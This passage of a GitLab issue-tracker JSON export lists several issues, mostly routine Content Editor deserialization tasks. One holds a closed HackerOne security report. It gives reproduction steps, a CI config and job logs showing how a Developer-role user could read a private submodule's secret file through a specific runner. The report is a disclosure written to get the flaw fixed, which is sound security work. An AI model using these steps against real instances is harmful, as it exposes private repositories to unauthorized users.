dev"],"milestone":{"id":2453022,"iid":73,"group_id":9970,"title":"15.1","description":"","state":"active","created_at":"2022-02-03T22:23:29.335Z","updated_at":"2022-02-03T22:23:29.335Z","due_date":"2022-06-17","start_date":"2022-05-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/73"},"assignees":[{"id":1523140,"username":"DavidNelsonGL","name":"David Nelson","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1523140/avatar.png","web_url":"https://gitlab.com/DavidNelsonGL"}],"author":{"id":6121997,"username":"mikeeddington","name":"Michael Eddington","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/6121997/avatar.png","web_url":"https://gitlab.com/mikeeddington"},"type":"ISSUE","assignee":{"id":1523140,"username":"DavidNelsonGL","name":"David Nelson","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1523140/avatar.png","web_url":"https://gitlab.com/DavidNelsonGL"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359040","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":10,"completed_count":10},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"10 of 10 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359040","notes":"https://gitlab.com/api/v4/projects/278964/issues/359040/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359040/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359040","relative":"#359040","full":"gitlab-org/gitlab#359040"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":106612321,"iid":359039,"project_id":278964,"title":"Backend: Developer can access private submoduled repositories","description":"**[HackerOne report #1504919](https://hackerone.com/reports/1504919)** by `rssah` on 2022-03-09, assigned to @nmalcolm\n\nThe comment section is long on this one as we worked with the reporter to reproduce the issue. Here is my take on the issue, which I was able to validate\n\n## Summary\n\nA developer can access the contents of a private submoduled repository when a Specific Runner is used (as opposed to Shared Runners). This has been validated on .com.\n\n## Steps to Reproduce\n\nWe will have User A, the victim Maintainer, and User B, the malicious Developer.\n\n### Set up the Group \u0026 Projects\n\nAll of the following actions are as User A. In example snippets, User A is named `nmalcolm`.\n\n1. Create a group called `submodule-test-group`\n1. Within that group, create a private project named `submodule-parent`\n1. Invite User B as a Developer role to the project\n1. Within the group create a private project named `submodule-child`. Create a file in the `main` branch called `secret.txt` with dummy text.\n1. Check out `submodule-parent` locally.\n1. Run `git submodule add git@gitlab.com:nmalcolm/submodule-child.git`. \n1. Modify `.gitmodules` as follows:\n\n```\n[submodule \"submodule-child\"]\n\tpath = submodule-child\n\turl = ../../submodule-test-group/submodule-child.git\n```\n\n1. Add a file `.gitlab-ci.yml` with the following contents:\n\n```\nvariables:\n  GIT_SUBMODULE_STRATEGY: recursive\nstages:\n    - build\n\nbuild:\n    stage: build\n    script:\n        - echo \"This is a benign CI job\"\n```\n\n1. Commit and push that to `submodule-parent`'s main branch.\n1. In the GitLab UI go to `https://gitlab.com/nmalcolm/submodule-parent/-/jobs/` and observe the latest job. The job should be successful.\n\n### Set up a Specific Runner\n\n1. As User A, go to the `submodule-parent` project, and get a Runner Registration token from `Settings \u003e CI/CD \u003e Runners`.\n1. In a Cloud Provider (e.g. [Sandbox Cloud](https://about.gitlab.com/handbook/infrastructure-standards/realms/sandbox/)) create a Runner.\n   1. I used AWS, with an Ubuntu image.\n   2. I followed these instructions to install Docker: https://docs.docker.com/engine/install/ubuntu/\n   3. I followed these instructions to install GitLab Runner: https://docs.gitlab.com/runner/install/docker.html#option-1-use-local-system-volume-mounts-to-start-the-runner-container\n   4. I followed these instructions to register the GitLab Runner, using the registration token from the earlier step: https://docs.gitlab.com/runner/register/#one-line-registration-command\n\n```\nroot@ip-172-31-28-151:/home/ubuntu# docker run --rm -v /srv/gitlab-runner/config:/etc/gitlab-runner gitlab/gitlab-runner register \\\n\u003e   --non-interactive \\\n\u003e   --executor \"docker\" \\\n\u003e   --docker-image alpine:latest \\\n\u003e   --url \"https://gitlab.com/\" \\\n\u003e   --registration-token \"GR13REDACTED\" \\\n\u003e   --description \"docker-runner\" \\\n\u003e   --tag-list \"test\" \\\n\u003e   --run-untagged=\"true\" \\\n\u003e   --locked=\"false\" \\\n\u003e   --access-level=\"not_protected\"\nRuntime platform                                    arch=amd64 os=linux pid=7 revision=bd40e3da version=14.9.1\nRunning in system-mode.\n\nRegistering runner... succeeded                     runner=GR13REDACTED\nRunner registered successfully. Feel free to start it, but if it's running already the config should be automatically reloaded!\n```\n\n1. As User A, in the GitLab UI go to Settings \u003e CI/CD. Observe the registered Specific Runner.\n1. Disable Shared Runners, so that all jobs will be run by the Specific Runner.\n1. Go and re-run the job we ran earlier. It will now use the Specific runner, and the message should still look like:\n\n```\nRunning with gitlab-runner 14.9.1 (bd40e3da)\n  on docker-runner i74p_kZM\nPreparing the \"docker\" executor\n00:05\nUsing Docker executor with image alpine:latest ...\nPulling docker image alpine:latest ...\nUsing docker image sha256:0ac33e5f5afa79e084075e8698a22d574816eea8d7b7d480586835657c3e1c8b for alpine:latest with digest alpine@sha256:4edbd2beb5f78b1014028f4fbb99f3237d9561100b6881aabbf5acce2c4f9454 ...\nPreparing environment\n00:01\nRunning on runner-i74pkzm-project-34588976-concurrent-0 via e3948fe46887...\nGetting source from Git repository\n00:02\nFetching changes with git depth set to 20...\nInitialized empty Git repository in /builds/submodule-test-group/submodule-parent/.git/\nCreated fresh repository.\nChecking out 857541f8 as main...\nUpdating/initializing submodules recursively with git depth set to 20...\nSubmodule 'submodule-child' (https://gitlab-ci-token:[MASKED]@gitlab.com/submodule-test-group/submodule-child.git) registered for path 'submodule-child'\nCloning into '/builds/submodule-test-group/submodule-parent/submodule-child'...\nSubmodule path 'submodule-child': checked out 'b3bdad20185059f520c277a4b8504cd4b64dd4a5'\nEntering 'submodule-child'\nEntering 'submodule-child'\nExecuting \"step_script\" stage of the job script\n00:01\nUsing docker image sha256:0ac33e5f5afa79e084075e8698a22d574816eea8d7b7d480586835657c3e1c8b for alpine:latest with digest alpine@sha256:4edbd2beb5f78b1014028f4fbb99f3237d9561100b6881aabbf5acce2c4f9454 ...\n$ echo \"This is a benign CI job\"\nThis is a benign CI job\nCleaning up project directory and file based variables\n00:01\nJob succeeded\n```\n\nWe can see that `submodule-child` was successfully cloned, and a benign message was echoed out. Screenshot attached.\n\nWe also note that `submodule-child` does not exist in the repository outside of that job; clicking \"Download\" from the project page downloads `submodule-child` as an empty directory, and clicking it in the UI redirects to its GitLab project.\n\n## Attack\n\nThe following steps are as User B, who was added in Step 2 above as a Developer to `submodule-parent`. In the following examples they are `nmtest`.\n\n1. Go to `submodule-parent`\n1. Note that clicking on `submodule-child` gives an error, and Downloading the repository downloads an empty folder named `submodule-child`. User B has no access to the contents of `submodule-child`.\n1. Create a new branch named `nmtest-branch`, based off `main`\n1. Modify `.gitlab-ci.yml` to contain:\n\n```\nvariables:\n  GIT_SUBMODULE_STRATEGY: recursive\nstages:\n    - build\n\nbuild:\n    stage: build\n    script:\n        - ls submodule-child\n        - cat submodule-child/secret.txt\n```\n\n1. Commit the change to the branch `nmtest-branch`\n1. In the GitLab UI go to `https://gitlab.com/nmalcolm/submodule-parent/-/jobs/` and observe the latest job.\n\nObserve the contents of the private repository, `submodule-child`, being disclosed to a user who should not have access:\n\n```\nRunning with gitlab-runner 14.9.1 (bd40e3da)\n  on docker-runner i74p_kZM\nPreparing the \"docker\" executor\n00:01\nUsing Docker executor with image alpine:latest ...\nPulling docker image alpine:latest ...\nUsing docker image sha256:0ac33e5f5afa79e084075e8698a22d574816eea8d7b7d480586835657c3e1c8b for alpine:latest with digest alpine@sha256:4edbd2beb5f78b1014028f4fbb99f3237d9561100b6881aabbf5acce2c4f9454 ...\nPreparing environment\n00:01\nRunning on runner-i74pkzm-project-34588976-concurrent-0 via e3948fe46887...\nGetting source from Git repository\n00:01\nFetching changes with git depth set to 20...\nReinitialized existing Git repository in /builds/submodule-test-group/submodule-parent/.git/\nChecking out d113baef as nmtest...\nUpdating/initializing submodules recursively with git depth set to 20...\nSynchronizing submodule url for 'submodule-child'\nEntering 'submodule-child'\nEntering 'submodule-child'\nHEAD is now at b3bdad2 Add new file\nEntering 'submodule-child'\nEntering 'submodule-child'\nExecuting \"step_script\" stage of the job script\n00:01\nUsing docker image sha256:0ac33e5f5afa79e084075e8698a22d574816eea8d7b7d480586835657c3e1c8b for alpine:latest with digest alpine@sha256:4edbd2beb5f78b1014028f4fbb99f3237d9561100b6881aabbf5acce2c4f9454 ...\n$ ls submodule-child\nREADME.md\nsecret.txt\n$ cat submodule-child/secret.txt\nThis is a secret!\nCleaning up project directory and file based variables\n00:00\nJob succeeded\n```\n\n### Further possible steps\n\n1. As User A (the victim), disable the Specific Runner and Re-enable the Shared Runners\n2. As User B (the attacker) re-run the malicious job. Observe that the job fails:\n\n```\nRunning with gitlab-runner 14.9.0~beta.68.g1283960c (1283960c)\n  on green-2.shared.runners-manager.gitlab.com/default ns46NMmJ\nPreparing the \"docker+machine\" executor\n00:08\nUsing Docker executor with image ruby:2.5 ...\nPulling docker image ruby:2.5 ...\nUsing docker image sha256:27d049ce98db4e55ddfaec6cd98c7c9cfd195bc7e994493776959db33522383b for ruby:2.5 with digest ruby@sha256:ecc3e4f5da13d881a415c9692bb52d2b85b090f38f4ad99ae94f932b3598444b ...\nPreparing environment\n00:01\nRunning on runner-ns46nmmj-project-34588976-concurrent-0 via runner-ns46nmmj-shared-1649890794-20321143...\nGetting source from Git repository\n00:02\n$ eval \"$CI_PRE_CLONE_SCRIPT\"\nFetching changes with git depth set to 20...\nInitialized empty Git repository in /builds/submodule-test-group/submodule-parent/.git/\nCreated fresh repository.\nChecking out d113baef as nmtest...\nUpdating/initializing submodules recursively with git depth set to 20...\nSubmodule 'submodule-child' (https://gitlab-ci-token:[MASKED]@gitlab.com/submodule-test-group/submodule-child.git) registered for path 'submodule-child'\nCloning into '/builds/submodule-test-group/submodule-parent/submodule-child'...\nremote: The project you were looking for could not be found or you don't have permission to view it.\nfatal: repository 'https://gitlab.com/submodule-test-group/submodule-child.git/' not found\nfatal: clone of 'https://gitlab-ci-token:[MASKED]@gitlab.com/submodule-test-group/submodule-child.git' into submodule path '/builds/submodule-test-group/submodule-parent/submodule-child' failed\nFailed to clone 'submodule-child'. Retry scheduled\nCloning into '/builds/submodule-test-group/submodule-parent/submodule-child'...\nremote: The project you were looking for could not be found or you don't have permission to view it.\nfatal: repository 'https://gitlab.com/submodule-test-group/submodule-child.git/' not found\nfatal: clone of 'https://gitlab-ci-token:[MASKED]@gitlab.com/submodule-test-group/submodule-child.git' into submodule path '/builds/submodule-test-group/submodule-parent/submodule-child' failed\nFailed to clone 'submodule-child' a second time, aborting\nCleaning up project directory and file based variables\n00:01\nERROR: Job failed: exit code 1\n```\n\n### Screenshots\n\n#### Attacker Jobs\n\nFails on a shared runner\n\n![shared-runner](/uploads/5bcf4c5dacc2d13a7130c7b7f1892eba/shared-runner.png)\n\nSucceeds on a specific runner\n\n![specific-runner](/uploads/1cb805ae0eab34c91e0d9634af44b93d/specific-runner.png)\n\n#### Project Set Up\n\nN.B. if you give me a username I can add you to the group so you can observe directly.\n\nVictim Maintainer has access to both\n\n![Screen_Shot_2022-04-14_at_11.40.19_AM](/uploads/dfc2c3af18e81b3447dd4c9e6e027a7f/Screen_Shot_2022-04-14_at_11.40.19_AM.png)\n\nAttacker Developer has access to one\n\n![Screen_Shot_2022-04-14_at_11.40.03_AM](/uploads/2fe1a6c75a481917742a2b5c679b4df6/Screen_Shot_2022-04-14_at_11.40.03_AM.png)\n\nVictim Maintainer is the only one in the group\n\n![Screen_Shot_2022-04-14_at_11.41.26_AM](/uploads/ffaa2d2eecb5c5b359e3da1328c3f115/Screen_Shot_2022-04-14_at_11.41.26_AM.png)\n\n\u003cdetails\u003e\n\u003csummary\u003e Original report here \u003c/summary\u003e\n\n[Report](#report) | [How To Reproduce](#how-to-reproduce)\n\n## Report\n\n#####  Summary\n\nWe have created two private projects P1 and P2. User U1 and U2 are administrator and developer (in terms of roles) respectively. U1 and U2 are both members of P1 but in P2, only user U1 is present with the administrator role. Now P1 is having a submodule link to P2. Obviously, all the local branches for U1 will have access to P2 files but U2's local branches will not have the files in the P2 submodule. The trick is to enable CI/CD in P1. In Git CI/CD yml file, we need to add a recursive command variable for P2 branch checkout to access files in it. Obviously, the P1's main branch is off-limits to U2, so he cannot edit/execute the pipelines. But we have created a branch for those U2 users in P1. Now the same Git CI/CD yml file the U2 user can push to his branch and can run the pipeline. This is leading to the displaying of all the project P2 contents for U2 who in the first place doesn't have access to.\n\n#####  Steps to reproduce\n\n(Step-by-step guide to reproduce the issue, including:)\n\n1. Create two projects and two users P1 and P2, U1 and U2.  \n2. Add U1 and U2 in P1 with U1 being administrator/maintainer and U2 being a developer.  \n3. Create one branch in P1 apart from the main branch and the U2 can use that branch. And make the main branch protected and do not allow \"Developer\" to push/merge.  \n4. Now add U1 as an administrator in the P2 project which only has one branch (main branch).  \n5. Create a submodule with the latest changeset of P2 inside the P1 root folder.  \n6. Here the user with his own P1 branch can not view any files of the created submodule  \n6. Create a pipeline with default git CI-CD yml file containing a set of instructions to list out all the files in the root folder of the P2 project's main branch.  \n7. The user U2 cannot have permission to start the pipeline if it's manually triggered. Also, he cannot edit the yml file in the main branch.  \n8. But the user U2 will have access to view the .gitmodules file which is in the P1 project root folder. There he can see the path of the root folder of project P2.  \n9. Now he can add his own statements in his own branch's git CI CD pipeline editor and can run the same pipeline.  \n10. While the pipeline runs, the folder contents are being listed to user U2 which is actually direct improper access control.\n\n\nGitLab version - GitLab Enterprise Edition 14.9.0-pre\n\n####  Impact\n\nThe users who do not have access to P2 project files can view the folder structure, file content, etc via CI/CD pipelines.\n\n## How To Reproduce\n\nPlease add [reproducibility information] to this section:\n\n1.\n1.\n1.\n\n[reproducibility information]: https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues\n\n\u003c/details\u003e","state":"closed","created_at":"2022-04-13T23:16:46.663Z","updated_at":"2022-11-21T09:20:02.047Z","closed_at":"2022-10-21T15:59:57.276Z","closed_by":{"id":11925179,"username":"avonbertoldi","name":"Axel von Bertoldi","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11925179/avatar.png","web_url":"https://gitlab.com/avonbertoldi"},"labels":["Category:Continuous Integration","Deliverable","FY23","HackerOne","OKR","Verify::P1","Weakness::CWE-284","backend","bug::vulnerability","devops::verify","group::runner","missed-SLO","missed-deliverable","missed:15.2","missed:15.3","priority::3","section::ops","security","severity::3","type::bug","workflow::production"],"milestone":{"id":2453027,"iid":77,"group_id":9970,"title":"15.5","description":"","state":"active","created_at":"2022-02-03T22:29:56.909Z","updated_at":"2022-02-03T22:29:56.909Z","due_date":"2022-10-17","start_date":"2022-09-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/77"},"assignees":[{"id":11925179,"username":"avonbertoldi","name":"Axel von Bertoldi","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11925179/avatar.png","web_url":"https://gitlab.com/avonbertoldi"}],"author":{"id":2741139,"username":"gitlab-securitybot","name":"GitLab SecurityBot","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2741139/avatar.png","web_url":"https://gitlab.com/gitlab-securitybot"},"type":"ISSUE","assignee":{"id":11925179,"username":"avonbertoldi","name":"Axel von Bertoldi","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/11925179/avatar.png","web_url":"https://gitlab.com/avonbertoldi"},"user_notes_count":62,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":"2022-06-26","confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359039","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359039","notes":"https://gitlab.com/api/v4/projects/278964/issues/359039/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359039/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359039","relative":"#359039","full":"gitlab-org/gitlab#359039"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":"at_risk"},{"id":106607809,"iid":359025,"project_id":278964,"title":"Deserialize table of contents on the FE","description":"","state":"closed","created_at":"2022-04-13T21:09:19.371Z","updated_at":"2022-09-21T12:02:02.955Z","closed_at":"2022-09-09T12:43:50.964Z","closed_by":{"id":3540517,"username":"ealcantara","name":"Enrique AlcÃ¡ntara","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3540517/avatar.png","web_url":"https://gitlab.com/ealcantara"},"labels":["Content Editor","Deliverable","GitLab Free","backend","devops::create","feature flag","feature::enhancement","frontend","group::editor","section::dev","type::feature","workflow::verification"],"milestone":{"id":2453026,"iid":76,"group_id":9970,"title":"15.4","description":"[GitLab 15.4 Release](https://gitlab.com/gitlab-org/gitlab/-/releases/v15.4.0-ee)","state":"active","created_at":"2022-02-03T22:29:22.015Z","updated_at":"2022-09-29T02:21:26.561Z","due_date":"2022-09-17","start_date":"2022-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/76"},"assignees":[{"id":3540517,"username":"ealcantara","name":"Enrique AlcÃ¡ntara","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3540517/avatar.png","web_url":"https://gitlab.com/ealcantara"}],"author":{"id":5212466,"username":"ericschurter","name":"Eric Schurter","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5212466/avatar.png","web_url":"https://gitlab.com/ericschurter"},"type":"ISSUE","assignee":{"id":3540517,"username":"ealcantara","name":"Enrique AlcÃ¡ntara","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3540517/avatar.png","web_url":"https://gitlab.com/ealcantara"},"user_notes_count":2,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359025","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359025","notes":"https://gitlab.com/api/v4/projects/278964/issues/359025/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359025/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359025","relative":"#359025","full":"gitlab-org/gitlab#359025"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7720,"epic":{"id":469003,"iid":7720,"title":"Deserialize GLFM on the frontend","url":"/groups/gitlab-org/-/epics/7720","group_id":9970,"human_readable_end_date":"Feb 17, 2023","human_readable_timestamp":"\u003cstrong\u003e1\u003c/strong\u003e month remaining"},"iteration":null,"health_status":null},{"id":106607780,"iid":359022,"project_id":278964,"title":"Deserialize front matter on the FE","description":"","state":"closed","created_at":"2022-04-13T21:08:43.452Z","updated_at":"2022-08-21T12:01:47.824Z","closed_at":"2022-08-16T12:15:48.882Z","closed_by":{"id":3540517,"username":"ealcantara","name":"Enrique AlcÃ¡ntara","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3540517/avatar.png","web_url":"https://gitlab.com/ealcantara"},"labels":["Content Editor","Deliverable","GitLab Free","backend","devops::create","feature::enhancement","frontend","group::editor","quad-planning::complete-no-action","section::dev","type::feature","workflow::verification"],"milestone":{"id":2453025,"iid":75,"group_id":9970,"title":"15.3","description":"","state":"active","created_at":"2022-02-03T22:28:50.229Z","updated_at":"2022-02-03T22:28:50.229Z","due_date":"2022-08-17","start_date":"2022-07-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/75"},"assignees":[{"id":3540517,"username":"ealcantara","name":"Enrique AlcÃ¡ntara","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3540517/avatar.png","web_url":"https://gitlab.com/ealcantara"}],"author":{"id":5212466,"username":"ericschurter","name":"Eric Schurter","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5212466/avatar.png","web_url":"https://gitlab.com/ericschurter"},"type":"ISSUE","assignee":{"id":3540517,"username":"ealcantara","name":"Enrique AlcÃ¡ntara","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3540517/avatar.png","web_url":"https://gitlab.com/ealcantara"},"user_notes_count":9,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359022","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359022","notes":"https://gitlab.com/api/v4/projects/278964/issues/359022/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359022/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359022","relative":"#359022","full":"gitlab-org/gitlab#359022"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7720,"epic":{"id":469003,"iid":7720,"title":"Deserialize GLFM on the frontend","url":"/groups/gitlab-org/-/epics/7720","group_id":9970,"human_readable_end_date":"Feb 17, 2023","human_readable_timestamp":"\u003cstrong\u003e1\u003c/strong\u003e month remaining"},"iteration":null,"health_status":null},{"id":106607760,"iid":359020,"project_id":278964,"title":"Deserialize color chips on the FE","description":"","state":"closed","created_at":"2022-04-13T21:08:16.550Z","updated_at":"2022-08-21T12:01:47.873Z","closed_at":"2022-08-10T19:15:54.516Z","closed_by":{"id":3540517,"username":"ealcantara","name":"Enrique AlcÃ¡ntara","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3540517/avatar.png","web_url":"https://gitlab.com/ealcantara"},"labels":["Content Editor","Deliverable","GitLab Free","backend","devops::create","feature::enhancement","frontend","group::editor","quad-planning::complete-no-action","section::dev","type::feature","workflow::ready for development"],"milestone":{"id":2453025,"iid":75,"group_id":9970,"title":"15.3","description":"","state":"active","created_at":"2022-02-03T22:28:50.229Z","updated_at":"2022-02-03T22:28:50.229Z","due_date":"2022-08-17","start_date":"2022-07-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/75"},"assignees":[{"id":3540517,"username":"ealcantara","name":"Enrique AlcÃ¡ntara","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3540517/avatar.png","web_url":"https://gitlab.com/ealcantara"}],"author":{"id":5212466,"username":"ericschurter","name":"Eric Schurter","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5212466/avatar.png","web_url":"https://gitlab.com/ericschurter"},"type":"ISSUE","assignee":{"id":3540517,"username":"ealcantara","name":"Enrique AlcÃ¡ntara","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3540517/avatar.png","web_url":"https://gitlab.com/ealcantara"},"user_notes_count":7,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359020","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359020","notes":"https://gitlab.com/api/v4/projects/278964/issues/359020/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359020/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359020","relative":"#359020","full":"gitlab-org/gitlab#359020"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7720,"epic":{"id":469003,"iid":7720,"title":"Deserialize GLFM on the frontend","url":"/groups/gitlab-org/-/epics/7720","group_id":9970,"human_readable_end_date":"Feb 17, 2023","human_readable_timestamp":"\u003cstrong\u003e1\u003c/strong\u003e month remaining"},"iteration":null,"health_status":null},{"id":106607728,"iid":359019,"project_id":278964,"title":"Set up client-side Commonmark deserialization in the Content Editor","description":"Implement the foundations of client-side parsing and rendering in the Content Editor by setting up Commonmark support. \n\nCommonmark parsing support is built-in in Remark. We already [set up remark](https://gitlab.com/gitlab-org/gitlab/-/issues/355785) in the GitLab application. The goal of this issue is mapping the Abstract Syntax Tree (AST) produced by remark to a ProseMirror document. \n\nCreating this AST to ProseMirror mapper will also set up the foundation for other content type mappers like Github Flavored Markdown and GitLab Flavored Markdown. \n\n### Implementation tasks \n\n- [x] Implement client-side Markdown Deserializer\n- [x] Map Commonmark content types to ProseMirror document node types","state":"closed","created_at":"2022-04-13T21:07:47.819Z","updated_at":"2022-10-08T13:34:05.749Z","closed_at":"2022-05-11T14:45:28.003Z","closed_by":{"id":3540517,"username":"ealcantara","name":"Enrique AlcÃ¡ntara","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3540517/avatar.png","web_url":"https://gitlab.com/ealcantara"},"labels":["Content Editor","GitLab Free","devops::create","feature::enhancement","group::editor","section::dev","type::feature"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":3540517,"username":"ealcantara","name":"Enrique AlcÃ¡ntara","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3540517/avatar.png","web_url":"https://gitlab.com/ealcantara"}],"author":{"id":5212466,"username":"ericschurter","name":"Eric Schurter","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5212466/avatar.png","web_url":"https://gitlab.com/ericschurter"},"type":"ISSUE","assignee":{"id":3540517,"username":"ealcantara","name":"Enrique AlcÃ¡ntara","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3540517/avatar.png","web_url":"https://gitlab.com/ealcantara"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359019","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":2,"completed_count":2},"weight":5,"blocking_issues_count":0,"has_tasks":true,"task_status":"2 of 2 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359019","notes":"https://gitlab.com/api/v4/projects/278964/issues/359019/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359019/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359019","relative":"#359019","full":"gitlab-org/gitlab#359019"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7720,"epic":{"id":469003,"iid":7720,"title":"Deserialize GLFM on the frontend","url":"/groups/gitlab-org/-/epics/7720","group_id":9970,"human_readable_end_date":"Feb 17, 2023","human_readable_timestamp":"\u003cstrong\u003e1\u003c/strong\u003e month remaining"},"iteration":null,"health_status":null},{"id":106607658,"iid":359016,"project_id":278964,"title":"Deserialize task lists on the FE","description":"Support GFM task list items deserialization in the Content Editorâ€™s remark-based deserializer","state":"closed","created_at":"2022-04-13T21:06:59.562Z","updated_at":"2022-06-21T12:02:13.985Z","closed_at":"2022-06-08T18:10:59.275Z","closed_by":{"id":3540517,"username":"ealcantara","name":"Enrique AlcÃ¡ntara","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3540517/avatar.png","web_url":"https://gitlab.com/ealcantara"},"labels":["Content Editor","Deliverable","GitLab Free","devops::create","feature::enhancement","group::editor","section::dev","type::feature","workflow::in dev"],"milestone":{"id":2453022,"iid":73,"group_id":9970,"title":"15.1","description":"","state":"active","created_at":"2022-02-03T22:23:29.335Z","updated_at":"2022-02-03T22:23:29.335Z","due_date":"2022-06-17","start_date":"2022-05-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/73"},"assignees":[{"id":3540517,"username":"ealcantara","name":"Enrique AlcÃ¡ntara","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3540517/avatar.png","web_url":"https://gitlab.com/ealcantara"}],"author":{"id":5212466,"username":"ericschurter","name":"Eric Schurter","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5212466/avatar.png","web_url":"https://gitlab.com/ericschurter"},"type":"ISSUE","assignee":{"id":3540517,"username":"ealcantara","name":"Enrique 